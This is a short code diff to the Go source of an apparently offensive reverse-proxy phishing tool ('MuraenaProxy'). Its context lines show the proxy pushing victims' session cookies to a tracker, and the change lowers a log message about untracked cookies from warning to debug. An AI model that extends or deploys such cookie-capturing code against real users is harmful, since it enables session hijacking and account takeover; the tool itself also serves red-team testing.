@@ -295,9 +295,8 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			muraena.Tracker.PushCookie(victim, sessCookie)
 		}
 	} else {
-
 		if len(response.Cookies()) > 0 {
-			log.Warning("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
+			log.Debug("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
 		}
 	}
 
